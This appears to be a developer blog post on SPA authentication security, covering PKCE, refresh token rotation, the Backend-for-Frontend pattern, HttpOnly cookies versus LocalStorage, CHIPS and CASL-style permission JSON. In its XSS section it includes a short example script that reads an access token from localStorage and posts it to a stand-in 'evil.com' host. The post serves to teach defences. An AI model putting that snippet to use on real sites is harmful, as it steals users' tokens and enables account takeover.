---
layout: post
title: SPA Security Architecture | Why You Shouldn't Store Tokens in the Browser 🔐
description: SPA Security Architecture | Why You Shouldn't Store Tokens in the Browser 🔐
date:   2026-01-22 11:00:00 +0900
author: Jeongjin Kim
categories: Security
tags:	Security SPA
---
# SPA Security Architecture: Why You Shouldn't Store Tokens in the Browser 🔐

Ever found yourself wondering "Should I store tokens in LocalStorage or cookies?" while building your SPA? Or thought "What's PKCE and why do I need it?" If so, this article is your answer. We've compiled everything you need to know about SPA authentication and authorization—the hottest topic in web security as of 2025.

---
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- 컨텐츠내 -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-3234744071843247"
     data-ad-slot="1671969273"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>

---

# Why Is SPA Security So Hard?

## The Trust Boundary Has Collapsed

Traditional web applications were simple. The server rendered HTML, and the browser just displayed it. Session information was safely stored in server memory, and the client only held a simple session ID cookie.

But SPAs are different. Business logic has moved to the browser, and state management happens on the client side. We can build gorgeous UIs with React or Vue, but from a security perspective, it's been a disaster. **We now have to store sensitive authentication tokens in an untrusted environment—the browser.**

## The Public Client Dilemma

The OAuth 2.0 standard classifies clients into two types:

**Confidential Client:** Applications running on servers. They can safely store `client_secret`. Think Node.js backends or Spring Boot servers.

**Public Client:** Applications running on user devices. SPAs, mobile apps, and desktop apps fall into this category. Since the code is exposed to users, they cannot keep secrets.

SPAs are inherently public clients because JavaScript code runs directly in the browser. Anyone can open the developer tools and see everything. Hardcoding `client_secret` in your code? That's like committing your password to GitHub.

---

# Threats Facing Public Clients

## 1. Client Impersonation

Confidential clients prove their identity with `client_secret`. But public clients can't do this. If you accidentally include `client_secret` in your SPA code, attackers can extract it using developer tools and impersonate your legitimate app.

Why is this a problem? Attackers can phish user data or request unauthorized tokens at will. That's why IETF and OWASP strictly prohibit using Client Credentials Grant with public clients.

## 2. The Fall of Implicit Flow

In the early days of SPA development, Implicit Flow was popular. It skipped the authorization code exchange step and delivered tokens directly in the URL hash fragment (`#`).

```
https://myapp.com/callback#access_token=eyJhbG...
```

Looks simple, but it had fatal flaws:

- **Token Leakage:** Tokens in URLs are exposed through browser history, proxy logs, and Referer headers
- **No Refresh:** For security reasons, refresh tokens weren't issued, requiring re-authentication every time the access token expired
- **Third-Party Cookie Blocking:** Silent renewal via iframes was blocked by ITP (Intelligent Tracking Prevention) policies

So as of 2025, Implicit Flow has been completely deprecated. It was removed from the OAuth 2.1 standard.

## 3. XSS: The Most Dangerous Enemy

The biggest threat to public clients is **XSS (Cross-Site Scripting)** attacks. SPAs depend on countless npm packages and CDN scripts. If even one gets infected or your code has vulnerabilities, attackers can execute malicious scripts to steal tokens.

```javascript
// Attacker's malicious script
const token = localStorage.getItem('access_token');
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token })
});
```

Unlike server-side sessions, tokens like JWT carry authority themselves. Once stolen, attackers can call any API as if they were the user.

---

# Solution 1: PKCE-based Authorization Code Flow

If you're hosting your SPA statically on S3 or a CDN without a backend, you need to handle authentication in the browser alone. The only standard for this is the **PKCE (Proof Key for Code Exchange)** enabled Authorization Code Flow.

## What Is PKCE?

PKCE (pronounced "pixie") was originally designed for mobile apps but is now the standard for all public clients. The core concept is creating and verifying a **dynamic secret**.

### How It Works

1. **Generate Code Verifier:** The client generates a cryptographically random string
   ```javascript
   const codeVerifier = generateRandomString(128);
   ```

2. **Derive Code Challenge:** Hash the verifier with SHA-256
   ```javascript
   const codeChallenge = base64url(sha256(codeVerifier));
   ```

3. **Authentication Request:** Send the challenge to the auth server
   ```
   /authorize?code_challenge=E9M...&code_challenge_method=S256
   ```

4. **Token Exchange:** After receiving the authorization code, send the original verifier
   ```
   /token?code=abc123&code_verifier=original_random_string
   ```

5. **Verification:** The server hashes the verifier and compares it with the initial challenge

### Why Is This Secure?

Even if an attacker intercepts the authorization code during the redirect, it's useless. To exchange it for tokens, they need the original `code_verifier`, which can't be reconstructed due to the hash's preimage resistance. **Attackers have the code but can't get the token.**

## PKCE's Limitations and Refresh Token Rotation

PKCE protects the authorization code, but ultimately the issued tokens must be stored in the browser. The XSS risk still exists. To mitigate this, **Refresh Token Rotation** is essential.

**How It Works:**
- Make refresh tokens single-use
- Issue a new refresh token every time you refresh the access token, immediately revoking the previous one
- If someone tries to refresh using an already-used (stolen) token, the server recognizes **"Token theft!"** and invalidates all tokens in that token family

This logs out both the attacker and the legitimate user, but it's a powerful defense that blocks attack persistence.

---

# Solution 2: BFF (Backend for Frontend) Pattern

The best architecture **strongly recommended** by IETF and security experts. The philosophy is simple:

**"No Tokens in the Browser"**

## Understanding BFF Architecture

BFF places a dedicated backend between the SPA and API servers. This backend can be a lightweight server implemented in Node.js, .NET, or Java, or an API gateway plugin.

```
[Browser] ←→ [BFF] ←→ [Auth Server]
             ↓
         [API Server]
```

### How It Works

1. **Confidential Client Transformation:** BFF runs in a server environment, so it can safely manage `client_secret`

2. **Token Hiding:** When users log in, the BFF communicates with the auth server to receive tokens. **The important part is these tokens are never sent to the browser.** Tokens are stored only in BFF's memory, Redis, or encrypted cookies.

3. **Session Cookie Issuance:** The BFF gives the SPA a session cookie with `HttpOnly`, `Secure`, and `SameSite` attributes instead of tokens. This cookie is just an identifier, with no JWT payload or anything like that.

4. **Proxy Role:** When the SPA calls an API and sends the cookie to the BFF, the BFF validates the cookie, finds the actual access token, and injects it into the API request's `Authorization` header before forwarding.

## BFF's Security Advantages

### Complete XSS Defense

The browser only has an `HttpOnly` cookie that JavaScript can't read. Even if XSS attackers execute malicious scripts, they **cannot steal the token itself**. At most they can make requests using the user's session, but that's preventable with CSRF defenses.

### Centralized Access Control

The BFF can filter API responses or aggregate data from multiple microservices before delivering it to the frontend. This solves over-fetching problems and simplifies frontend logic.

### Complexity Isolation

You can isolate complex authentication logic like token refresh, error handling, and logout to the backend, letting SPA code focus on business logic.

## Token Handler Pattern: BFF Lite

One implementation of the BFF pattern, the token handler pattern **specializes only in security features** instead of relaying all APIs. It's an approach proposed by companies like Curity.

**Components:**
- **OAuth Agent:** Handles only token issuance, refresh, and cookie issuance
- **OAuth Proxy:** Operates at the API gateway level to validate cookies and exchange them for tokens

**Benefit:** You can statically deploy your SPA to a CDN while leveraging API gateways to gain BFF's security benefits. You can enhance security with just infrastructure configuration without writing separate BFF server code.

---
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- 컨텐츠내 -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-3234744071843247"
     data-ad-slot="1671969273"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
---
# LocalStorage vs Cookie: The Never-Ending Debate

This is an eternal debate among SPA developers: "Where should I store tokens?" This issue involves a tradeoff between two attack vectors: XSS and CSRF.

## Pros and Cons Comparison

| Storage Method | XSS Vulnerability | CSRF Vulnerability | Persistence | Characteristics |
|---------------|-------------------|-------------------|-------------|-----------------|
| LocalStorage / SessionStorage | Very High ⚠️ | Low ✅ | Until browser closes | Immediately accessible via JS. Instantly stolen on XSS. **Not recommended** |
| In-Memory (JS variables) | High ⚠️ | Low ✅ | Lost on page reload | Not stored on disk but memory dump possible via XSS. Re-login on every refresh |
| HttpOnly Cookie | Low ✅ | High ⚠️ | Based on expiry settings | JS access blocked. Can't steal token itself via XSS. **Recommended** |

## XSS vs CSRF: Which Is More Dangerous?

Many developers mistakenly think "Cookies are vulnerable to CSRF, so LocalStorage is better." But security experts' views are the opposite.

**XSS's Destructive Power:**
- Once tokens are stolen, attackers can call APIs and hijack accounts anytime, anywhere without user involvement
- Defense is practically impossible

**CSRF's Defensibility:**
- Attacks are only possible when users have their browsers open
- Can be defended near-perfectly with `SameSite` cookie policies and Anti-CSRF tokens

**Conclusion:** Even though CSRF risks exist (but are defensible), we should use `HttpOnly` cookies to prevent undefendable token theft (XSS). This is the core philosophy of the BFF pattern.

## The Browser's Future: CHIPS

Third-party cookie blocking policies have been a major obstacle to maintaining authentication for SPAs embedded in iframes (chat widgets, payment modules, etc.). To solve this, browser vendors like Google introduced **CHIPS (Cookies Having Independent Partitioned State)** technology.

**How It Works:**
```javascript
Set-Cookie: session=abc123; Partitioned; Secure; SameSite=None
```

Adding the `Partitioned` attribute stores cookies in isolated storage per top-level site. Cookies for your service embedded in Site A aren't shared with Site B. This blocks third-party tracking while allowing normal session maintenance for embedded apps.

---

# Authorization Management: Frontend-Backend Synchronization

If authentication is about "who is this person," authorization is about "what can this person do." SPAs face the complex challenge of synchronizing backend authorization logic with frontend UI state.

## Beyond RBAC to Permission-Centric

In the past, we simply passed role information like `role: 'admin'` to the frontend. But as business gets complex, this hits limitations.

For example:
- "Managers can edit articles" → Simple
- "Managers can only edit articles from their department" → Can't express with role names alone

So the latest trend is **delivering specific permission lists in JSON format**.

## Efficient Permission JSON Structure (CASL Style)

We recommend a structure compatible with the widely-used CASL library in the JavaScript ecosystem:

```json
{
  "user": {
    "id": "u123",
    "roles": ["editor"],
    "permissions": [
      {
        "action": "read",
        "subject": "Article"
      },
      {
        "action": "update",
        "subject": "Article",
        "conditions": {
          "authorId": "${user.id}",
          "status": "draft"
        }
      },
      {
        "action": "delete",
        "subject": "Comment",
        "inverted": true
      }
    ]
  }
}
```

**Interpretation:**
- Can read all Articles
- Can update Articles only if author is self and status is draft
- Can never delete Comments (inverted: true → Deny rule)

## Synchronization Strategy

**Core Principle: "Security on the server, UX on the client"**

1. **API Is the Source of Truth:** Actual data access control must be performed on the API server. Frontend logic can be bypassed, so never trust it.

2. **Synchronization Mechanism:** When users log in or load pages, call an endpoint like `/api/my-permissions` to fetch the permission JSON.

3. **UI Control:** Store the received JSON in a global state manager like Pinia (Vue) or Context API (React). Then control the UI with custom directives or components:

```vue
<!-- Vue example -->
<button v-can="'update', post">Edit Post</button>
```

```jsx
// React example
<Can I="create" a="Project">
  <CreateButton />
</Can>
```

Hide or disable buttons for users without permissions. But remember: **this is just UX.** Real security happens on the backend!

---

# Conclusion and Practical Recommendations

The SPA security landscape in 2025 requires much more sophisticated architecture than before. Browser constraints are tightening, and attack techniques are becoming more advanced.

## Key Takeaways

### 1. Adopt BFF Pattern (Top Priority) 🏆

If you're building security-critical business applications, adopt the BFF pattern that **completely removes tokens from the browser**. It's currently the only and most powerful architecture that can fundamentally prevent account hijacking via XSS.

### 2. Use HttpOnly Cookies

Use cookies with `HttpOnly`, `Secure`, and `SameSite` attributes instead of LocalStorage for token storage. Block script access to maximize security.

### 3. PKCE and Token Rotation (Second Best)

If BFF adoption is impossible (Serverless environments, etc.), use PKCE-based Authorization Code Flow, but **always implement refresh token rotation and reuse detection mechanisms**. This minimizes damage from token theft.

### 4. Granular Permission Synchronization

Go beyond simple RBAC to synchronize frontend-backend with Permission JSON structures including conditions. But always perform final authorization checks on the backend API!

## Future Outlook

Web security will extend Zero Trust principles to the client side. Browsers will become increasingly closed environments (complete death of third-party cookies), and mastering new standard technologies like partitioned cookies (CHIPS) or Storage Access API will become essential.

Additionally, application-layer security protocols like **DPoP (Demonstrating Proof-of-Possession)** that bind tokens to specific clients will gradually become mainstream.

---

# Final Thoughts

SPA security goes beyond simply "where to store tokens." You need to embed security from the architecture design phase (Security by Design).

If you're starting an SPA project after a while or need to improve legacy system security, bookmark this article. It'll help when you need it! 🚀

---

# Appendix: Quick Reference

## Storage Selection Guide

| Situation | Recommended Approach | Reason |
|-----------|---------------------|--------|
| Production Environment | BFF + HttpOnly Cookie | Complete XSS defense |
| Serverless SPA | PKCE + Token Rotation | Second best when backend unavailable |
| Dev/Test Environment | LocalStorage (temporary) | Convenience, but must replace before production |
| Embedded Widgets | CHIPS utilization | Bypass third-party cookie blocking |



<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- 컨텐츠내 -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-3234744071843247"
     data-ad-slot="1671969273"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>